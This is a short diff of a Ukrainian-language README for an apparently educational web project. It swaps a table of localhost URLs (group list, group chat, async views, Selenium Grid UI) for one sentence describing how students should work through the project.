-| http://localhost:8001/groups/ | Список груп |
-| http://localhost:8001/groups/`<pk>`/chat/ | Груповий чат |
-| http://localhost:8001/async/notes/ | Async views |
-| http://localhost:4444 | Selenium Grid UI (для дебагу) |
+Цей README має бути точкою входу: спочатку студент запускає застосунок, потім читає архітектуру, після цього відкриває конкретні файли і перевіряє кожну ідею на живому коді.
